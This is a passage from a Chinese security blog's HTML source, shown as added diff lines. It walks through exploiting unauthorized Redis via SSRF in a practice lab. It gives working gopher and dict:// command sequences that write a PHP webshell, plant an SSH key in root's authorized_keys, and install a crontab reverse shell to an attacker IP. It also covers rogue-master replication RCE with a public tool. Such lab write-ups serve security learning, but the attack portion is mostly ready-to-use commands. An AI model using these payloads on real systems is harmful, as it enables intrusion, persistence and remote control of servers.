class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用dict协议"><a href="#利用dict协议" class="headerlink" title="利用dict协议"></a>利用dict协议</h3><p>如果redis有认证，可以通过<br><strong>dict:&#x2F;&#x2F;ip:6379&#x2F;auth:密码</strong>  (密码使用字典爆破)<br>也就是说dict协议可以用来执行redis命令<br>注：dict中空格改为冒号    冒号会被解析为空格</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/17.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>/info</span><br><span class="line"><span class="built_in">dict</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>/config:<span class="built_in">set</span>:<span class="built_in">dir</span>:/var/www/html</span><br><span class="line"><span class="built_in">dict</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>/config:<span class="built_in">set</span>:dbfilename:shell.php</span><br><span class="line"><span class="built_in">dict</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>/<span class="built_in">set</span>:payload:<span class="string">&quot;\x3c\x3f\x3d\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x3f\x3e&quot;</span>//(&lt;?=phpinfo();?&gt;的<span class="number">16</span>进制形式)</span><br><span class="line"><span class="built_in">dict</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>/save</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/18.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>成功写入
+<p>由此可以看出，dict协议一次只能执行一行命令</p>
+<h2 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h2><p>如果对方开启了ssh，可以尝试写入ssh公钥文件。从而进行ssh登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.在kali上生成私钥对</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">2.</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set payload &quot;1生成的公钥文件（id_rsa.pub）内容&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h3 id="靶场历险记2"><a href="#靶场历险记2" class="headerlink" title="靶场历险记2"></a>靶场历险记2</h3><p>在kali上生成私钥对</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/19.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/20.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>id_rsa是私钥文件，id_rsa.pub是公钥文件<br>目标就是在目标主机创建一个authorized_keys文件，并把公钥内容写到目标主机下面<br>依旧是写入文件</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/21.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>构造gopher协议
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/22.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/23.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>成功写入<br>（靶机端口和ip地址）</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/24.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>不需要密码，也可以成功登入</p>
+<h2 id="crontab计划任务反弹shell"><a href="#crontab计划任务反弹shell" class="headerlink" title="crontab计划任务反弹shell"></a>crontab计划任务反弹shell</h2><blockquote>
+<p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p>
+<ol>
+<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
+<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
+</ol>
+<p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
+</blockquote>
+<h3 id="什么是crontab计划任务"><a href="#什么是crontab计划任务" class="headerlink" title="什么是crontab计划任务"></a>什么是crontab计划任务</h3><blockquote>
+<p>crontab计划任务在Linux系统中是一种强大的工具，用于安排程序或脚本在特定时间自动执行。通俗地讲，crontab就像是你的个人电脑或服务器上的一个“定时闹钟”，但比闹钟更智能，因为它不仅能按设定的时间唤醒你（执行程序），还能在特定的日期、月份甚至星期几执行任务。</p>
+</blockquote>
+<p><strong>注：在写入计划任务前后要加上\n来进行换行，否则数据污染会导致计划任务无法执行</strong></p>
+<h3 id="使用dict协议"><a href="#使用dict协议" class="headerlink" title="使用dict协议"></a>使用dict协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dict://172.250.250.9:6379/flushall     清除所有键值</span><br><span class="line">dict://172.250.250.9:6379/config:set:dir:/var/spool/cron/     设置保存路径</span><br><span class="line">dict://172.250.250.9:6379/config:set:dbfilename:root           保存名称</span><br><span class="line">dict://172.250.250.9:6379/set:x:&quot;\n*/1****/bin/bash -i &gt;&amp; /dev/tcp/192.168.187.130/port 0&gt;&amp;1\n&quot;   将反弹shell写入x键值(后面要进行16进制转码)</span><br><span class="line">dict://172.250.250.9:6379/save   保存</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用gopher协议"><a href="#使用gopher协议" class="headerlink" title="使用gopher协议"></a>使用gopher协议</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ufw allow <span class="number">1234</span></span><br><span class="line">开启<span class="number">1234</span>端口</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/25.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>kali起一个监听
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/26.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/27.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>成功反弹
+
+<h1 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h1><h2 id="主从复制getshell"><a href="#主从复制getshell" class="headerlink" title="主从复制getshell"></a>主从复制getshell</h2><h3 id="什么是主从复制"><a href="#什么是主从复制" class="headerlink" title="什么是主从复制"></a>什么是主从复制</h3><blockquote>
+<p>Redis主从复制是一种数据复制和备份的方式，旨在将一个Redis实例（主节点）的数据复制到另一个或多个Redis实例（从节点）。</p>
+</blockquote>
+<p>优点：</p>
+<blockquote>
+<ol>
+<li><strong>提升读取性能</strong>：通过读写分离，主节点写，从节点读。</li>
+<li><strong>数据备份和恢复</strong>：主节点出问题时，可以从从节点恢复数据。</li>
+</ol>
+</blockquote>
+<p>Redis主从复制的原理</p>
+<blockquote>
+<p>Redis主从复制的过程可以分为几个阶段：</p>
+<ol>
+<li><strong>初始化同步阶段</strong>：<ul>
+<li>从节点与主节点建立连接后，发送一个同步请求给主节点。</li>
+<li>主节点接到请求后，会生成一份当前数据的快照（RDB文件），并将这份快照发送给从节点。</li>
+<li>从节点接收到快照后，会加载这份快照到自己的内存中，从而实现数据的初始化同步。</li>
+</ul>
+</li>
+<li><strong>增量复制阶段</strong>：<ul>
+<li>在初始化同步完成后，主节点会将后续接收到的写操作指令发送给从节点。</li>
+<li>从节点接收并重新执行这些写操作指令，以保持与主节点数据的一致性。</li>
+</ul>
+</li>
+<li><strong>持续复制阶段</strong>：<ul>
+<li>从节点会持续监听主节点的写操作指令，并按照接收顺序执行，以保持与主节点数据的实时同步。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这也是redis从ssrf到rce的核心:</span><br><span class="line">通过主从复制，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据时就会通过主从复制复制到其它从redis</span><br></pre></td></tr></table></figure>
+
+<h4 id="看一下主从复制的效果："><a href="#看一下主从复制的效果：" class="headerlink" title="看一下主从复制的效果："></a>看一下主从复制的效果：</h4><p>先在一个机器上开两个redis实例，一个端口为6379，一个端口为6380<br>6379端口已经配置好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> cp /etc/redis/redis.conf  /etc/redis/redis-<span class="number">6380.</span>conf</span><br><span class="line">创建<span class="number">6380</span>端口的配置文件</span><br><span class="line">vi /etc/redis/redis-<span class="number">6380.</span>conf</span><br><span class="line">将下面写入：</span><br><span class="line">port <span class="number">6380</span></span><br><span class="line">pidfile /var/run/redis/redis-<span class="number">6380.</span>pid</span><br><span class="line">logfile <span class="string">&quot;/var/log/redis/redis-6380.log&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /var/lib/redis/<span class="number">6380</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">创建/var/lib/redis/<span class="number">6380</span>目录</span><br><span class="line">sudo mkdir -p /var/lib/redis/<span class="number">6380</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">启动<span class="number">6379</span> redis实例</span><br><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line">启动<span class="number">6380</span> redis实例</span><br><span class="line">redis-server /etc/redis/redis-<span class="number">6380.</span>conf</span><br></pre></td></tr></table></figure>
+
+<p>把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code></p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/28.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>即就是将当前redis实例（6379）作为6380的从节点，6380为主节点</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/29.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>没有test的键于是就设置一个test键，值为test，并退出</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/30.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<p>再连接从节点，发现存在test键，值为test<br>说明完成主从复制</p>
+<blockquote>
+<p>如果想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
+</blockquote>
+<h3 id="redis-module"><a href="#redis-module" class="headerlink" title="redis module"></a>redis module</h3><p><strong>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件</strong></p>
+<h3 id="redis-rogue-server-工具："><a href="#redis-rogue-server-工具：" class="headerlink" title="redis-rogue-server 工具："></a>redis-rogue-server 工具：</h3><p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<h4 id="工具介绍："><a href="#工具介绍：" class="headerlink" title="工具介绍："></a>工具介绍：</h4><blockquote>
+<p>该工具的原理就是首先创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。<br>有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 slaveof 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。<br>然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机（slaver）加载模块执行系统命令即可。</p>
+<p>但是该工具无法输入Redis密码进行Redis认证，也就是说该工具只能在目标存在Redis未授权访问漏洞时使用。如果目标Redis存在密码是不能使用该工具的。</p>
+</blockquote>
+<p>用到的项目：<br><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br><a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf/blob/master/ssrf-redis.py">https://github.com/xmsec/redis-ssrf/blob/master/ssrf-redis.py</a></p>
+<p>将第一个的exp.so和redis-rogue-server.py以及第二个的ssrf-redis.py这三个文件放在kali的同一个目录下</p>
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/31.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>ssrf-redis.py构造gopher协议，长这样
+<img src="/2024/08/28/ssrf%E4%B9%8B%E6%9C%AA%E6%8E%88%E6%9D%83redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/32.png" class=""  data-tag='post-image' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>redis-rogue-server.py创建恶意redis服务器
+<p>再将gopher协议打进去即可</p>
+<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665?time__1311=n4+xni5mqYqQw4CqGNDQTbmOfDkSkbae74D#toc-8">浅析Redis中SSRF的利用 - 先知社区</a><br><a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/10/09/%E8%B7%9F%E7%9D%80%E5%9B%BD%E5%85%89%E5%B8%88%E5%82%85%E5%AD%A6%E4%B9%A0SSRF/">跟着国光师傅学习SSRF</a><br>靶场：<a target="_blank" rel="noopener" href="https://github.com/Duoduo-chino/ssrf_vul/blob/main/README.md">ssrf_vul&#x2F;README.md at main · Duoduo-chino&#x2F;ssrf_vul</a></p>
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
+        <div class="trm-older-publication">
+            
+            <a class="trm-op-top trm-anima-link" href="/2024/07/22/2024-7-22/">
+                <span class="trm-op-cover">
+                    <img alt="cover" class="no-fancybox" src="/img/1.jpg">
+                </span>
+                <h6 class="trm-op-title">2024.7.22</h6>
+            </a>
+            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/07/22</li>
+                <li>12:41</li>
+                <li>日常</li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+    <div class="trm-card trm-scroll-animation comment-container">
+    <div id="tcomment"></div>
+</div>
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-footer-card trm-scroll-animation">
+
+    
+        <div class="trm-footer-item">
+            <a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">陕ICP备2024025299号-1</a>
+        </div>
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024- 2024</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">yeepie</span>
+        </div>
+    
+
+    
+        <div class="trm-footer-item">
+            <span>
+                由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.2.0
+            </span>
+            <span class="footer-separator" data-separator=" | "></span>
+            <span> 
+                主题 - 
+                <a rel="noopener" href='https://github.com/MaLuns/hexo-theme-async' target='_blank'>Async</a>
+                v2.2.2
+            </span>
+        </div>
+      
+
+    
+        <div class="trm-footer-item blog-run-long"></div>
+     
+
+     
+
+    
+        <span id="busuanzi_container_site_pv">
+                本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        目录导航
+				<span id="post-toc-top">
+					置顶
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
+        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-1" title="条件："><a rel="nofollow" class="trm-toc-link" href="#条件："><span class="trm-toc-number">1.</span> <span class="trm-toc-text">条件：</span></a></li><li class="trm-toc-item trm-toc-level-1" title="RESP协议"><a rel="nofollow" class="trm-toc-link" href="#RESP协议"><span class="trm-toc-number">2.</span> <span class="trm-toc-text">RESP协议</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-2" title="基本格式"><a rel="nofollow" class="trm-toc-link" href="#基本格式"><span class="trm-toc-number">2.1.</span> <span class="trm-toc-text">基本格式</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-1" title="常见ssrf攻击方式："><a rel="nofollow" class="trm-toc-link" href="#常见ssrf攻击方式："><span class="trm-toc-number">3.</span> <span class="trm-toc-text">常见ssrf攻击方式：</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-2" title="绝对路径写webshell"><a rel="nofollow" class="trm-toc-link" href="#绝对路径写webshell"><span class="trm-toc-number">3.1.</span> <span class="trm-toc-text">绝对路径写webshell</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="靶场历险记1"><a rel="nofollow" class="trm-toc-link" href="#靶场历险记1"><span class="trm-toc-number">3.1.1.</span> <span class="trm-toc-text">靶场历险记1</span></a></li><li class="trm-toc-item trm-toc-level-3" title="利用gopherus生成payload"><a rel="nofollow" class="trm-toc-link" href="#利用gopherus生成payload"><span class="trm-toc-number">3.1.2.</span> <span class="trm-toc-text">利用gopherus生成payload</span></a></li><li class="trm-toc-item trm-toc-level-3" title="构造gopher协议脚本"><a rel="nofollow" class="trm-toc-link" href="#构造gopher协议脚本"><span class="trm-toc-number">3.1.3.</span> <span class="trm-toc-text">构造gopher协议脚本</span></a></li><li class="trm-toc-item trm-toc-level-3" title="利用dict协议"><a rel="nofollow" class="trm-toc-link" href="#利用dict协议"><span class="trm-toc-number">3.1.4.</span> <span class="trm-toc-text">利用dict协议</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="写入ssh公钥"><a rel="nofollow" class="trm-toc-link" href="#写入ssh公钥"><span class="trm-toc-number">3.2.</span> <span class="trm-toc-text">写入ssh公钥</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="靶场历险记2"><a rel="nofollow" class="trm-toc-link" href="#靶场历险记2"><span class="trm-toc-number">3.2.1.</span> <span class="trm-toc-text">靶场历险记2</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="crontab计划任务反弹shell"><a rel="nofollow" class="trm-toc-link" href="#crontab计划任务反弹shell"><span class="trm-toc-number">3.3.</span> <span class="trm-toc-text">crontab计划任务反弹shell</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="什么是crontab计划任务"><a rel="nofollow" class="trm-toc-link" href="#什么是crontab计划任务"><span class="trm-toc-number">3.3.1.</span> <span class="trm-toc-text">什么是crontab计划任务</span></a></li><li class="trm-toc-item trm-toc-level-3" title="使用dict协议"><a rel="nofollow" class="trm-toc-link" href="#使用dict协议"><span class="trm-toc-number">3.3.2.</span> <span class="trm-toc-text">使用dict协议</span></a></li><li class="trm-toc-item trm-toc-level-3" title="使用gopher协议"><a rel="nofollow" class="trm-toc-link" href="#使用gopher协议"><span class="trm-toc-number">3.3.3.</span> <span class="trm-toc-text">使用gopher协议</span></a></li></ol></li></ol></li><li class="trm-toc-item trm-toc-level-1" title="其他利用"><a rel="nofollow" class="trm-toc-link" href="#其他利用"><span class="trm-toc-number">4.</span> <span class="trm-toc-text">其他利用</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-2" title="主从复制getshell"><a rel="nofollow" class="trm-toc-link" href="#主从复制getshell"><span class="trm-toc-number">4.1.</span> <span class="trm-toc-text">主从复制getshell</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="什么是主从复制"><a rel="nofollow" class="trm-toc-link" href="#什么是主从复制"><span class="trm-toc-number">4.1.1.</span> <span class="trm-toc-text">什么是主从复制</span></a></li><li class="trm-toc-item trm-toc-level-3" title="redis module"><a rel="nofollow" class="trm-toc-link" href="#redis-module"><span class="trm-toc-number">4.1.2.</span> <span class="trm-toc-text">redis module</span></a></li><li class="trm-toc-item trm-toc-level-3" title="redis-rogue-server 工具："><a rel="nofollow" class="trm-toc-link" href="#redis-rogue-server-工具："><span class="trm-toc-number">4.1.3.</span> <span class="trm-toc-text">redis-rogue-server 工具：</span></a></li></ol></li></ol></li><li class="trm-toc-item trm-toc-level-1" title="参考文章："><a rel="nofollow" class="trm-toc-link" href="#参考文章："><span class="trm-toc-number">5.</span> <span class="trm-toc-text">参考文章：</span></a></li></ol>
+      </div>
+    </div>
+
+            
+<div class="trm-fixed-container">
+    
+        <div class="trm-fixed-btn post-toc-btn" data-title="目录">
+            <i class="iconfont fas fa-th-list"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=2.2.2"></script>
+    
+
+    
+
+    <!-- 数学公式 -->
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+
+            
+<script src="https://unpkg.com/twikoo@1.6.7/dist/twikoo.all.min.js" data-swup-reload-script data-reset="true"></script>
+
+            <script data-swup-reload-script>
+                twikoo.init({
+                    ...{"enable":"ture","envId":"https://yeepie-twikoo1.hf.space"},
+                    el:'#tcomment'
+                }).then(function () {
+                    let container = document.querySelector('body>.tk-admin-container')
+                    if(container) container.remove()
+                    document.body.append(document.querySelector('.tk-admin-container'))
+                });;
+            </script>
+
+        
+    
+
+		
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=2.2.2"></script>
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+</body>
+
+</html>
